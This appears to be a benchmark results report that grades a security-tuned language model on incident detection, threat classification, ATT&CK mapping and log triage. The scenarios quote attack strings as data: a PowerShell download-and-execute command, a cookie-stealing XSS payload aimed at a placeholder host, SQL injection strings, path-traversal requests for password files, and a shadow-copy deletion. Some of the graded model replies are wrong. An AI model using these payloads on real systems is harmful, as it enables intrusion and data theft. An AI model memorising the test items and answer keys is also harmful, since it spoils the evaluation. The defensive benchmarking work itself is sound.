# Cybersecurity benchmark — `hf.co/Mungert/Foundation-Sec-8B-Instruct-GGUF:Q4_K_M`
Model: `hf.co/Mungert/Foundation-Sec-8B-Instruct-GGUF:Q4_K_M`
Run started: 2026-05-06 01:03:55

## Summary

| Section | Correct | Total | Accuracy |
|---|---|---|---|
| Incident recognition | 4 | 7 | 57% |
| Threat classification | 7 | 7 | 100% |
| MITRE ATT&CK mapping | 7 | 10 | 70% |
| Syslog triage (raw) | 5 | 8 | 62% |
| Syslog triage (drain3) | 5 | 8 | 62% |
| **Overall (with drain3)** | **23** | **32** | **72%** |

## 1. Incident recognition (binary)

### INC-1 — expected: **benign** — FAIL (0.5s)
_Scenario_: User logs in from their normal office IP at 9:02am on a workday and opens email.

_Reply_: Incident.

### INC-2 — expected: **incident** — PASS (0.4s)
_Scenario_: Domain admin account authenticates successfully from an IP in a country the company has no offices in, at 03:14 local time, followed within 4 minutes by 18 RDP sessions to internal hosts.

_Reply_: Incident.

### INC-3 — expected: **incident** — PASS (0.4s)
_Scenario_: Web server logs show 50,000 POST requests to /wp-login.php from 1,200 distinct IPs within 10 minutes, with 3 successful logins to admin accounts.

_Reply_: Incident.

### INC-4 — expected: **benign** — FAIL (0.6s)
_Scenario_: A scheduled nightly backup job runs at 02:00, copies 40GB to the backup server, and completes with exit code 0. Same as previous 30 nights.

_Reply_: Incident
This is an anomaly in the system's behavior that requires further investigation to determine if it is malicious or not.

### INC-5 — expected: **incident** — PASS (0.6s)
_Scenario_: EDR alerts that powershell.exe spawned by winword.exe executed: IEX (New-Object Net.WebClient).DownloadString('http://185.x.x.x/a.ps1')

_Reply_: Incident. This is an attempt to download and execute malicious code from an external source, which could indicate a potential compromise.

### INC-6 — expected: **benign** — FAIL (0.5s)
_Scenario_: Developer pushes a commit to a feature branch, CI runs unit tests, all pass.

_Reply_: Incident.

### INC-7 — expected: **incident** — PASS (0.5s)
_Scenario_: DNS server logs show a single host querying 4,000+ unique subdomains of a single domain over 2 hours, with TXT record responses averaging 200 bytes.

_Reply_: Incident.

## 2. Threat-type classification

### THR-1 — accepted keywords: ['ransomware'] — PASS (0.6s)
_Scenario_: Files on user workstations are renamed with .lockbit extension. A README.txt demands 2 BTC for decryption keys.

_Reply_: Ransomware - Files encrypted by a malicious program that demands payment to restore access.

_Match_: 'ransomware'

### THR-2 — accepted keywords: ['phishing', 'bec', 'business email compromise', 'spear'] — PASS (0.5s)
_Scenario_: Email appears to come from the CFO asking the AP clerk to wire $48,000 to a new vendor urgently. The reply-to address has a slight typo in the domain.

_Reply_: Phishing - An attempt to steal sensitive information by posing as a trusted source.

_Match_: 'phishing'

### THR-3 — accepted keywords: ['sql injection', 'sqli'] — PASS (0.8s)
_Scenario_: Application logs show: SELECT * FROM users WHERE name='admin' OR '1'='1'-- in the username field of the login form.

_Reply_: SQL Injection. This is an attempt to exploit a vulnerability in the application's database by injecting malicious SQL code into the input fields. In this case, the attacker is attempting to bypass authentication by exploiting the OR condition in the WHERE clause of the SELECT statement.

_Match_: 'sql injection'

### THR-4 — accepted keywords: ['xss', 'cross-site scripting', 'cross site scripting'] — PASS (0.7s)
_Scenario_: A web app reflects a user-supplied 'name' query parameter directly into the HTML body without encoding. Attacker crafts a URL containing <script>fetch('//evil/'+document.cookie)</script>.

_Reply_: Cross-Site Scripting (XSS) - An attacker injects malicious JavaScript code into a web application's response to steal sensitive information like cookies.

_Match_: 'xss'

### THR-5 — accepted keywords: ['credential', 'credential dumping', 'credential theft', 'credential access', 'lsass'] — PASS (0.7s)
_Scenario_: Internal user runs an executable received via email. The process injects into lsass.exe, dumps memory, and exfiltrates the dump over HTTPS to an external server.

_Reply_: The specific threat or attack type is "Credential Dumping" which involves extracting sensitive information such as usernames and passwords from the Local Security Authority Subsystem Service (LSASS) process memory.

_Match_: 'credential'

### THR-6 — accepted keywords: ['ddos', 'dos', 'denial of service', 'denial-of-service', 'amplification'] — PASS (0.9s)
_Scenario_: Multiple hosts on the corporate network suddenly send 10Gbps of UDP traffic to the same external IP, sourced from spoofed addresses. The target is the company's public DNS.

_Reply_: DDoS (Distributed Denial-of-Service) Attack: A DDoS attack floods a server with excessive traffic to overwhelm it and make it unavailable to legitimate users. In this case, multiple hosts on the corporate network are sending UDP traffic to the company's public DNS, which is being spoofed by attackers.

_Match_: 'ddos'

### THR-7 — accepted keywords: ['supply chain', 'supply-chain'] — PASS (0.7s)
_Scenario_: A signed update from a trusted third-party vendor's auto-update channel installs a backdoor on thousands of customer machines. The vendor's build server was compromised.

_Reply_: Supply Chain Attack - A malicious actor infiltrated the vendor's build server and inserted malware into their software updates, which were then distributed to customers' machines.

_Match_: 'supply chain'

## 3. MITRE ATT&CK technique mapping

**Per-case results**

| Case | Scenario | Accepted IDs | Detected | Result |
|---|---|---|---|---|
| ATT-1 | An attacker sends a Word document containing a malicious macro to a... | `T1566.001, T1566, T1204.002, T1204` | `T1204.002` | PASS |
| ATT-2 | Adversary uses Mimikatz to extract plaintext passwords and NTLM has... | `T1003.001, T1003` | `T1003.001` | PASS |
| ATT-3 | Attacker creates a new scheduled task on the victim host to run the... | `T1053.005, T1053` | `T1547.001` | FAIL |
| ATT-4 | After initial access, the attacker uses 'net group "Domain Admins" ... | `T1087.002, T1087, T1018, T1482` | `T1087` | PASS |
| ATT-5 | Adversary establishes persistence by adding a value under HKCU\Soft... | `T1547.001, T1547` | `T1547.001` | PASS |
| ATT-6 | C2 beaconing traffic is encoded as DNS TXT record queries to attack... | `T1071.004, T1071, T1048.003, T1048` | `T1071.004` | PASS |
| ATT-7 | Attacker uses PsExec from a compromised workstation to execute a re... | `T1021.002, T1021, T1570, T1569.002` | `T1547.001` | FAIL |
| ATT-8 | Before encrypting victim files, the ransomware deletes Windows Volu... | `T1490` | `T1070.002` | FAIL |
| ATT-9 | A binary uses base64-encoded PowerShell with the -EncodedCommand fl... | `T1027, T1059.001, T1140` | `T1059.001` | PASS |
| ATT-10 | Attacker compresses sensitive files into a password-protected RAR a... | `T1560.001, T1560` | `T1560` | PASS |

### ATT-1 — accepted IDs: ['T1566.001', 'T1566', 'T1204.002', 'T1204'] — PASS (0.5s)
_Scenario_: An attacker sends a Word document containing a malicious macro to a target user. The user opens the doc and enables macros, which downloads a payload.

_Reply_: T1204.002 - User Execution: Malicious File

_Detected IDs_: T1204.002

### ATT-2 — accepted IDs: ['T1003.001', 'T1003'] — PASS (0.5s)
_Scenario_: Adversary uses Mimikatz to extract plaintext passwords and NTLM hashes from LSASS memory on a compromised host.

_Reply_: T1003.001 - OS Credential Dumping: LSASS Memory

_Detected IDs_: T1003.001

### ATT-3 — accepted IDs: ['T1053.005', 'T1053'] — FAIL (0.6s)
_Scenario_: Attacker creates a new scheduled task on the victim host to run their implant every time the system starts.

_Reply_: T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

_Detected IDs_: T1547.001

### ATT-4 — accepted IDs: ['T1087.002', 'T1087', 'T1018', 'T1482'] — PASS (0.5s)
_Scenario_: After initial access, the attacker uses 'net group "Domain Admins" /domain' and 'nltest /dclist' to map the AD environment.

_Reply_: T1087 - Command and Scripting Interpreter

_Detected IDs_: T1087

### ATT-5 — accepted IDs: ['T1547.001', 'T1547'] — PASS (0.6s)
_Scenario_: Adversary establishes persistence by adding a value under HKCU\Software\Microsoft\Windows\CurrentVersion\Run that points to their malware.

_Reply_: T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

_Detected IDs_: T1547.001

### ATT-6 — accepted IDs: ['T1071.004', 'T1071', 'T1048.003', 'T1048'] — PASS (0.9s)
_Scenario_: C2 beaconing traffic is encoded as DNS TXT record queries to attacker-controlled subdomains, bypassing the proxy.

_Reply_: T1071.004 - Application Layer Protocol: DNS

Explanation: The scenario describes a C2 beaconing traffic that is encoded as DNS TXT record queries to attacker-controlled subdomains, bypassing the proxy. This behavior matches with the MITRE ATT&CK technique T1071.004 - Application Layer Protocol: DNS.

_Detected IDs_: T1071.004

### ATT-7 — accepted IDs: ['T1021.002', 'T1021', 'T1570', 'T1569.002'] — FAIL (0.6s)
_Scenario_: Attacker uses PsExec from a compromised workstation to execute a remote command on a domain controller using stolen admin credentials.

_Reply_: T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

_Detected IDs_: T1547.001

### ATT-8 — accepted IDs: ['T1490'] — FAIL (0.5s)
_Scenario_: Before encrypting victim files, the ransomware deletes Windows Volume Shadow Copies using 'vssadmin delete shadows /all /quiet'.

_Reply_: T1070.002 - Indicator Removal on Host: File Deletion

_Detected IDs_: T1070.002

### ATT-9 — accepted IDs: ['T1027', 'T1059.001', 'T1140'] — PASS (0.5s)
_Scenario_: A binary uses base64-encoded PowerShell with the -EncodedCommand flag to obscure its real payload from defenders.

_Reply_: T1059.001 - Command and Scripting Interpreter: PowerShell

_Detected IDs_: T1059.001

### ATT-10 — accepted IDs: ['T1560.001', 'T1560'] — PASS (0.5s)
_Scenario_: Attacker compresses sensitive files into a password-protected RAR archive on the victim host before exfiltration.

_Reply_: T1560.002 - Archive Collected Data: Archive via Custom Method

_Detected IDs_: T1560

## 4. Raw syslog triage (binary) — baseline vs drain3-augmented

### SYS-1 — SSH brute force followed by successful login — expected: **incident**
_Logs_:
```
Mar 10 03:41:02 webhost sshd[28401]: Failed password for invalid user admin from 185.220.101.45 port 47812 ssh2
Mar 10 03:41:05 webhost sshd[28403]: Failed password for invalid user root from 185.220.101.45 port 47815 ssh2
Mar 10 03:41:08 webhost sshd[28405]: Failed password for invalid user oracle from 185.220.101.45 port 47820 ssh2
Mar 10 03:41:11 webhost sshd[28407]: Failed password for invalid user postgres from 185.220.101.45 port 47824 ssh2
Mar 10 03:41:14 webhost sshd[28409]: Failed password for invalid user git from 185.220.101.45 port 47829 ssh2
Mar 10 03:41:17 webhost sshd[28411]: Failed password for invalid user test from 185.220.101.45 port 47833 ssh2
Mar 10 03:41:20 webhost sshd[28413]: Failed password for ubuntu from 185.220.101.45 port 47837 ssh2
Mar 10 03:43:21 webhost sshd[28571]: Accepted password for ubuntu from 185.220.101.45 port 47891 ssh2
Mar 10 03:43:21 webhost sshd[28571]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
```

_drain3 templates_:
```
[x6] Mar 10 <*> webhost <*> Failed password for invalid user <*> from 185.220.101.45 port <*> ssh2
[x2] Mar 10 <*> webhost <*> <*> password for ubuntu from 185.220.101.45 port <*> ssh2
[x1] Mar 10 03:43:21 webhost sshd[28571]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
```

**Baseline (raw only)** — PASS (0.5s)
_Reply_: Incident.

**With drain3 summary** — PASS (0.5s)
_Reply_: Incident

### SYS-2 — Normal pubkey login from internal range — expected: **benign**
_Logs_:
```
Mar 10 09:14:32 webhost sshd[14201]: Accepted publickey for alice from 10.0.4.22 port 51842 ssh2: RSA SHA256:7Hk2pQ...
Mar 10 09:14:32 webhost sshd[14201]: pam_unix(sshd:session): session opened for user alice by (uid=0)
Mar 10 09:14:33 webhost systemd-logind[612]: New session 2841 of user alice.
```

_drain3 templates_:
```
[x1] Mar 10 09:14:32 webhost sshd[14201]: Accepted publickey for alice from 10.0.4.22 port 51842 ssh2: RSA SHA256:7Hk2pQ...
[x1] Mar 10 09:14:32 webhost sshd[14201]: pam_unix(sshd:session): session opened for user alice by (uid=0)
[x1] Mar 10 09:14:33 webhost systemd-logind[612]: New session 2841 of user alice.
```

**Baseline (raw only)** — FAIL (0.5s)
_Reply_: Incident.

**With drain3 summary** — FAIL (0.5s)
_Reply_: Incident

### SYS-3 — Daily cron run — expected: **benign**
_Logs_:
```
Mar 10 02:00:01 webhost CRON[31201]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
Mar 10 02:00:23 webhost rsyslogd: [origin software="rsyslogd" swVersion="8.2102.0"] rsyslogd was HUPed
Mar 10 02:00:24 webhost CRON[31201]: pam_unix(cron:session): session closed for user root
```

_drain3 templates_:
```
[x1] Mar 10 02:00:01 webhost CRON[31201]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
[x1] Mar 10 02:00:23 webhost rsyslogd: [origin software="rsyslogd" swVersion="8.2102.0"] rsyslogd was HUPed
[x1] Mar 10 02:00:24 webhost CRON[31201]: pam_unix(cron:session): session closed for user root
```

**Baseline (raw only)** — FAIL (0.9s)
_Reply_: Incident. The log shows that the cron job was executed, which is not inherently suspicious. However, it also indicates that the rsyslogd service was HUPed and a session for user root was closed. These actions could be indicative of an attacker attempting to cover their tracks or disrupt system operations.

**With drain3 summary** — FAIL (0.4s)
_Reply_: Incident

### SYS-4 — SQL injection probes in Apache access log — expected: **incident**
_Logs_:
```
185.62.190.13 - - [10/Mar/2026:14:22:03 +0000] "GET /products.php?id=1' OR '1'='1-- HTTP/1.1" 500 1842
185.62.190.13 - - [10/Mar/2026:14:22:04 +0000] "GET /products.php?id=1+UNION+SELECT+username,password+FROM+users-- HTTP/1.1" 200 4129
185.62.190.13 - - [10/Mar/2026:14:22:05 +0000] "GET /products.php?id=1;DROP+TABLE+users-- HTTP/1.1" 500 1842
185.62.190.13 - - [10/Mar/2026:14:22:06 +0000] "GET /products.php?id=1+AND+SLEEP(5)-- HTTP/1.1" 200 4129
```

_drain3 templates_:
```
[x3] 185.62.190.13 - - <*> +0000] "GET <*> HTTP/1.1" <*> <*>
[x1] 185.62.190.13 - - [10/Mar/2026:14:22:03 +0000] "GET /products.php?id=1' OR '1'='1-- HTTP/1.1" 500 1842
```

**Baseline (raw only)** — PASS (0.4s)
_Reply_: Incident

**With drain3 summary** — PASS (0.4s)
_Reply_: Incident

### SYS-5 — Sudo adding service account to sudo group at 03:17 — expected: **incident**
_Logs_:
```
Mar 10 03:17:42 webhost sudo:      bob : TTY=pts/3 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc_backup
Mar 10 03:17:42 webhost sudo: pam_unix(sudo:session): session opened for user root by bob(uid=0)
Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to group 'sudo'
Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to shadow group 'sudo'
Mar 10 03:17:43 webhost sudo: pam_unix(sudo:session): session closed for user root
```

_drain3 templates_:
```
[x1] Mar 10 03:17:42 webhost sudo: bob : TTY=pts/3 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc_backup
[x1] Mar 10 03:17:42 webhost sudo: pam_unix(sudo:session): session opened for user root by bob(uid=0)
[x1] Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to group 'sudo'
[x1] Mar 10 03:17:43 webhost usermod[18293]: add 'svc_backup' to shadow group 'sudo'
[x1] Mar 10 03:17:43 webhost sudo: pam_unix(sudo:session): session closed for user root
```

**Baseline (raw only)** — PASS (0.6s)
_Reply_: Incident. The log shows that the user bob is adding the group svc_backup to the sudo group, which could be an attempt to escalate privileges and gain unauthorized access to sensitive information.

**With drain3 summary** — PASS (0.5s)
_Reply_: Incident

### SYS-6 — Path traversal probes in Apache access log — expected: **incident**
_Logs_:
```
198.51.100.7 - - [10/Mar/2026:11:03:18 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 2841
198.51.100.7 - - [10/Mar/2026:11:03:19 +0000] "GET /download?file=..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1" 403 891
198.51.100.7 - - [10/Mar/2026:11:03:20 +0000] "GET /download?file=....//....//etc/hosts HTTP/1.1" 200 412
```

_drain3 templates_:
```
[x3] 198.51.100.7 - - <*> +0000] "GET <*> HTTP/1.1" <*> <*>
```

**Baseline (raw only)** — PASS (0.5s)
_Reply_: Incident

**With drain3 summary** — PASS (0.5s)
_Reply_: Incident

### SYS-7 — Normal authenticated web session — expected: **benign**
_Logs_:
```
10.0.4.22 - alice [10/Mar/2026:10:14:02 +0000] "GET /dashboard HTTP/1.1" 200 18421 "https://intranet.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
10.0.4.22 - alice [10/Mar/2026:10:14:03 +0000] "GET /static/app.js HTTP/1.1" 200 84219 "https://intranet.example.com/dashboard" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
10.0.4.22 - alice [10/Mar/2026:10:14:03 +0000] "POST /api/v1/metrics HTTP/1.1" 200 142 "https://intranet.example.com/dashboard" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
```

_drain3 templates_:
```
[x3] 10.0.4.22 - alice <*> +0000] <*> <*> HTTP/1.1" 200 <*> <*> "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
```

**Baseline (raw only)** — FAIL (0.5s)
_Reply_: Incident

**With drain3 summary** — FAIL (0.5s)
_Reply_: Incident

### SYS-8 — Windows 4625 burst then 4624 from same IP — expected: **incident**
_Logs_:
```
Mar 10 02:18:14 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:16 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:18 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:21 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:18:24 dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
Mar 10 02:21:42 dc01 winlogbeat: EventID=4624 Account=Administrator LogonType=3 IpAddress=192.168.50.13 WorkstationName=KIOSK-04
```

_drain3 templates_:
```
[x5] Mar 10 <*> dc01 winlogbeat: EventID=4625 Account=Administrator LogonType=3 FailureReason=BadPassword IpAddress=192.168.50.13 WorkstationName=KIOSK-04
[x1] Mar 10 02:21:42 dc01 winlogbeat: EventID=4624 Account=Administrator LogonType=3 IpAddress=192.168.50.13 WorkstationName=KIOSK-04
```

**Baseline (raw only)** — PASS (0.5s)
_Reply_: Incident

**With drain3 summary** — PASS (0.5s)
_Reply_: Incident
